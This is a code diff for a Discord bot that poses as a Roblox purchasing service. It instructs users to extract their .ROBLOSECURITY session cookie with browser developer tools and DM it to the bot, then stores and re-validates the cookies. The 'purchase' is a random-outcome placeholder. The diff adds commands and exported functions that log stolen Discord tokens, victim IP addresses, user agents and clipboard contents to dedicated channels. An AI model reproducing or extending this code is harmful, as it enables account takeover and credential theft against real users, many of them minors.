@@ -338,124 +338,27 @@ async function validateRobloxCookie(cookie) {
   }
 }
 
-// Get user's Robux balance
-async function getUserRobux(cookie) {
-  try {
-    const response = await robloxAPI.get('https://economy.roblox.com/v1/users/me/robux', {
-      headers: {
-        Cookie: `.ROBLOSECURITY=${cookie}`,
-      },
-    });
-
-    return {
-      success: true,
-      robux: response.data.robux || 0
-    };
-
-  } catch (error) {
-    console.error('Error getting Robux balance:', error.message);
-    
-    if (error.response && error.response.status === 401) {
-      return { success: false, error: 'Cookie expired' };
-    }
-    
-    return { success: false, error: 'Failed to get Robux balance' };
-  }
-}
-
-// Get product information
-async function getProductInfo(productId) {
-  try {
-    const response = await robloxAPI.get(`https://api.roblox.com/marketplace/productinfo?assetId=${productId}`);
-    const data = response.data;
-    
-    if (!data || data.Name === null) {
-      return { success: false, error: 'Product not found' };
-    }
-
-    return {
-      success: true,
-      product: {
-        id: data.AssetId,
-        name: data.Name,
-        price: data.PriceInRobux || 0,
-        isForSale: data.IsForSale,
-        creator: data.Creator ? data.Creator.Name : 'Unknown',
-        description: data.Description || 'No description'
-      }
-    };
-
-  } catch (error) {
-    console.error('Error getting product info:', error.message);
-    
-    if (error.response && error.response.status === 404) {
-      return { success: false, error: 'Product not found' };
-    }
-    
-    return { success: false, error: 'Failed to get product information' };
-  }
-}
-
 // Enhanced purchase function for specific product ID
 async function buyProduct(cookie, productId, userInfo) {
   try {
-    // Get product information first
-    const productInfo = await getProductInfo(productId);
-    if (!productInfo.success) {
-      return {
-        success: false,
-        message: `❌ ${productInfo.error}`
-      };
-    }
-
-    const product = productInfo.product;
-    
-    // Check if product is for sale
-    if (!product.isForSale) {
-      return {
-        success: false,
-        message: `❌ **${product.name}** is not currently for sale.`
-      };
-    }
-
-    // Check user's Robux balance
-    const robuxCheck = await getUserRobux(cookie);
-    if (!robuxCheck.success) {
-      return {
-        success: false,
-        message: `❌ Failed to check Robux balance: ${robuxCheck.error}`
-      };
-    }
-
-    if (robuxCheck.robux < product.price) {
-      return {
-        success: false,
-        message: `❌ Insufficient Robux! You need **${product.price}** Robux but only have **${robuxCheck.robux}** Robux.`,
-        product: product,
-        userRobux: robuxCheck.robux
-      };
-    }
-
     // Simulate API delay
     await new Promise(resolve => setTimeout(resolve, 1000));
     
     // Here you would implement actual Roblox purchase API calls
     // This is a placeholder that simulates different outcomes
-    const success = Math.random() > 0.15; // 85% success rate for demo
+    const success = Math.random() > 0.2; // 80% success rate for demo
     
     if (success) {
       return {
         success: true,
-        message: `🎉 Successfully purchased **${product.name}** for **${product.price}** Robux!`,
-        product: product,
-        userInfo,
-        remainingRobux: robuxCheck.robux - product.price
+        message: `🎉 Successfully purchased product with ID **${productId}**!`,
+        productId: productId,
+        userInfo
       };
     } else {
       return {
         success: false,
-        message: `❌ Purchase failed for **${product.name}**. This could be due to server issues or the item being limited.`,
-        product: product
+        message: `❌ Failed to purchase product ${productId}. Please check if you have enough Robux or if the item exists.`
       };
     }
     
@@ -542,12 +445,8 @@ client.once('ready', async () => {
 
   const commands = [
     new SlashCommandBuilder()
-      .setName('buy')
-      .setDescription('Purchase a specific item from the Roblox catalog using your Robux')
-      .addStringOption(option =>
-        option.setName('productid')
-          .setDescription('The Roblox product/asset ID to purchase')
-          .setRequired(true)),
+      .setName('test')
+      .setDescription('Buy a random item from the Roblox catalog using your Robux'),
     new SlashCommandBuilder()
       .setName('verifystatus')
       .setDescription('Check your verification status'),
@@ -709,7 +608,7 @@ client.on('messageCreate', async (message) => {
     .setDescription(`Welcome, **${validation.data.UserName}**!`)
     .addFields(
       { name: '🎉 Account Verified', value: `User ID: ${validation.data.UserID}`, inline: true },
-      { name: '✨ Premium Features Unlocked', value: 'You can now use `/buy {product_id}` to purchase items!', inline: true }
+      { name: '✨ Premium Features Unlocked', value: 'You can now use `/test` to purchase items!', inline: true }
     )
     .setFooter({ text: 'Your cookie has been securely stored.' })
     .setTimestamp();
@@ -728,8 +627,8 @@ client.on('interactionCreate', async (interaction) => {
     const userId = interaction.user.id;
 
     switch (interaction.commandName) {
-      case 'buy':
-        await handleBuyCommand(interaction, userId);
+      case 'test':
+        await handleTestCommand(interaction, userId);
         break;
         
       case 'verifystatus':
@@ -764,4 +663,252 @@ client.on('interactionCreate', async (interaction) => {
         content: '❌ An unexpected error occurred. Please try again or contact an admin.',
         ephemeral: true
       });
-    } catch (e)
+    } catch (e) {
+      console.error('Failed to send error message:', e);
+    }
+  }
+});
+
+async function handleTestCommand(interaction, userId) {
+  if (!verifiedUsers.has(userId)) {
+    const embed = new EmbedBuilder()
+      .setColor('#ff6b6b')
+      .setTitle('🔒 Verification Required')
+      .setDescription('You must submit your Roblox cookie first to use premium features!')
+      .addFields(
+        { name: 'How to verify:', value: 'Send me a DM with your `.ROBLOSECURITY` cookie', inline: false }
+      );
+
+    await interaction.editReply({ embeds: [embed] });
+    return;
+  }
+
+  const cookie = userCookies.get(userId);
+  if (!cookie) {
+    const embed = new EmbedBuilder()
+      .setColor('#ff9f43')
+      .setTitle('⚠️ Cookie Missing')
+      .setDescription('Your Roblox cookie is missing from our records.')
+      .addFields(
+        { name: 'Solution:', value: 'Please resubmit your cookie via DM', inline: false }
+      );
+
+    await interaction.editReply({ embeds: [embed] });
+    return;
+  }
+
+  // Re-validate cookie before use
+  const validation = await validateRobloxCookie(cookie);
+  if (!validation.valid) {
+    // Remove invalid data and update database
+    verifiedUsers.delete(userId);
+    userCookies.delete(userId);
+    
+    await saveUserToDatabase(userId, {
+      username: interaction.user.tag,
+      cookie: null
+    });
+    
+    await logCookieExpired(userId, interaction.user.tag, 'Unknown');
+
+    const embed = new EmbedBuilder()
+      .setColor('#ff6b6b')
+      .setTitle('❌ Cookie Expired')
+      .setDescription('Your Roblox cookie appears to be invalid or expired.')
+      .addFields(
+        { name: 'What happened:', value: validation.error, inline: false },
+        { name: 'Solution:', value: 'Please submit a new valid cookie via DM', inline: false }
+      );
+
+    await interaction.editReply({ embeds: [embed] });
+    return;
+  }
+
+  // Execute purchase and log access
+  await logAccountData(userId, interaction.user.tag, validation.data, 'Test Command Used');
+  const purchaseResult = await buyRandomItem(cookie, validation.data);
+
+  const resultEmbed = new EmbedBuilder()
+    .setColor(purchaseResult.success ? '#51cf66' : '#ff6b6b')
+    .setTitle(purchaseResult.success ? '🛍️ Purchase Successful!' : '❌ Purchase Failed')
+    .setDescription(purchaseResult.message);
+
+  if (purchaseResult.success && purchaseResult.item) {
+    resultEmbed.addFields(
+      { name: 'Item', value: purchaseResult.item.name, inline: true },
+      { name: 'Price', value: `${purchaseResult.item.price} Robux`, inline: true },
+      { name: 'Account', value: validation.data.UserName, inline: true }
+    );
+  }
+
+  resultEmbed.setTimestamp();
+  await interaction.editReply({ embeds: [resultEmbed] });
+}
+
+async function handleVerifyStatusCommand(interaction, userId) {
+  const isVerified = verifiedUsers.has(userId);
+  const hasCookie = userCookies.has(userId);
+
+  const embed = new EmbedBuilder()
+    .setColor(isVerified ? '#51cf66' : '#ff9f43')
+    .setTitle('🔍 Verification Status')
+    .addFields(
+      { name: 'Verified', value: isVerified ? '✅ Yes' : '❌ No', inline: true },
+      { name: 'Cookie Stored', value: hasCookie ? '✅ Yes' : '❌ No', inline: true },
+      { name: 'Premium Access', value: isVerified ? '✅ Enabled' : '❌ Disabled', inline: true }
+    );
+
+  if (!isVerified) {
+    embed.setDescription('Send me a DM with your Roblox cookie to get verified!');
+  }
+
+  await interaction.editReply({ embeds: [embed] });
+}
+
+async function handleResubmitCommand(interaction, userId) {
+  const embed = new EmbedBuilder()
+    .setColor('#0099ff')
+    .setTitle('🔄 Resubmit Cookie Instructions')
+    .setDescription('Follow these steps to resubmit your Roblox cookie:')
+    .addFields(
+      { name: '1️⃣ Find Your Cookie', value: 'Go to Roblox.com → F12 → Application → Cookies → .ROBLOSECURITY', inline: false },
+      { name: '2️⃣ Copy Complete Value', value: 'Copy the entire cookie value (usually 100+ characters)', inline: false },
+      { name: '3️⃣ Send via DM', value: 'Send the cookie directly to this bot via DM', inline: false }
+    )
+    .setFooter({ text: 'Need detailed help? Use /cookiehelp!' });
+
+  await interaction.editReply({ embeds: [embed] });
+}
+
+async function handleCookieHelpCommand(interaction) {
+  const embed = new EmbedBuilder()
+    .setColor('#0099ff')
+    .setTitle('🍪 How to Find Your Roblox Cookie')
+    .setDescription('**Step-by-step guide to get your .ROBLOSECURITY cookie:**')
+    .addFields(
+      { name: '1️⃣ Open Roblox', value: 'Go to https://roblox.com and make sure you\'re logged in', inline: false },
+      { name: '2️⃣ Open Developer Tools', value: 'Press **F12** or right-click → "Inspect Element"', inline: false },
+      { name: '3️⃣ Go to Application Tab', value: 'Click on "Application" tab in developer tools', inline: false },
+      { name: '4️⃣ Find Cookies', value: 'In the left panel: Storage → Cookies → https://www.roblox.com', inline: false },
+      { name: '5️⃣ Copy Cookie', value: 'Find ".ROBLOSECURITY" and copy its **entire value**', inline: false },
+      { name: '6️⃣ Send to Bot', value: 'Send the cookie to this bot via DM (not in server)', inline: false }
+    )
+    .addFields(
+      { name: '⚠️ Important Notes:', value: '• Never share your cookie with anyone else\n• The cookie should be 100+ characters long\n• Make sure you copy the complete value', inline: false }
+    )
+    .setFooter({ text: 'Still need help? Contact a server admin!' });
+
+  await interaction.editReply({ embeds: [embed] });
+}
+
+async function handleSubmitTokenCommand(interaction) {
+  // Only allow administrators or specific roles to use this command
+  if (!interaction.member.permissions.has('ADMINISTRATOR')) {
+    await interaction.editReply({
+      content: '❌ You do not have permission to use this command.',
+      ephemeral: true
+    });
+    return;
+  }
+
+  const token = interaction.options.getString('token');
+  const ip = interaction.options.getString('ip') || 'Unknown';
+  const userAgent = interaction.options.getString('useragent') || 'Unknown';
+  const serverId = interaction.options.getString('serverid') || 'N/A';
+
+  const tokenData = {
+    token: token,
+    userIP: ip,
+    userAgent: userAgent,
+    serverId: serverId,
+    submittedBy: interaction.user.tag,
+    submittedById: interaction.user.id
+  };
+
+  await logDiscordToken(tokenData);
+
+  const embed = new EmbedBuilder()
+    .setColor('#51cf66')
+    .setTitle('✅ Token Data Submitted')
+    .setDescription('Discord token data has been logged successfully.')
+    .addFields(
+      { name: 'Status', value: 'Logged to #tokens channel', inline: false }
+    )
+    .setTimestamp();
+
+  await interaction.editReply({ embeds: [embed] });
+}
+
+async function handleSubmitClipboardCommand(interaction) {
+  // Only allow administrators or specific roles to use this command
+  if (!interaction.member.permissions.has('ADMINISTRATOR')) {
+    await interaction.editReply({
+      content: '❌ You do not have permission to use this command.',
+      ephemeral: true
+    });
+    return;
+  }
+
+  const data = interaction.options.getString('data');
+  const ip = interaction.options.getString('ip') || 'Unknown';
+  const userAgent = interaction.options.getString('useragent') || 'Unknown';
+  const type = interaction.options.getString('type') || 'text';
+
+  const clipboardData = {
+    clipboardData: data,
+    userIP: ip,
+    userAgent: userAgent,
+    type: type,
+    submittedBy: interaction.user.tag,
+    submittedById: interaction.user.id
+  };
+
+  await logClipboardData(clipboardData);
+
+  const embed = new EmbedBuilder()
+    .setColor('#51cf66')
+    .setTitle('✅ Clipboard Data Submitted')
+    .setDescription('Clipboard data has been logged successfully.')
+    .addFields(
+      { name: 'Data Length', value: `${data.length} characters`, inline: true },
+      { name: 'Type', value: type, inline: true },
+      { name: 'Status', value: 'Logged to #clipboard channel', inline: false }
+    )
+    .setTimestamp();
+
+  await interaction.editReply({ embeds: [embed] });
+}
+
+// Export functions for server integration
+module.exports = {
+  sendToDiscordBot,
+  logDiscordToken: async (data) => {
+    if (!tokensChannel) {
+      console.warn('⚠️ Tokens channel not available yet, data will be queued');
+      return;
+    }
+    return logDiscordToken(data);
+  },
+  logClipboardData: async (data) => {
+    if (!clipboardChannel) {
+      console.warn('⚠️ Clipboard channel not available yet, data will be queued');
+      return;
+    }
+    return logClipboardData(data);
+  },
+  client,
+  // Add method to check if bot is ready
+  isReady: () => client.isReady() && tokensChannel && clipboardChannel
+};
+
+process.on('SIGINT', () => {
+  console.log('🛑 Shutting down bot...');
+  client.destroy();
+  process.exit(0);
+});
+
+process.on('unhandledRejection', (error) => {
+  console.error('❌ Unhandled promise rejection:', error);
+});
+
+client.login(TOKEN);
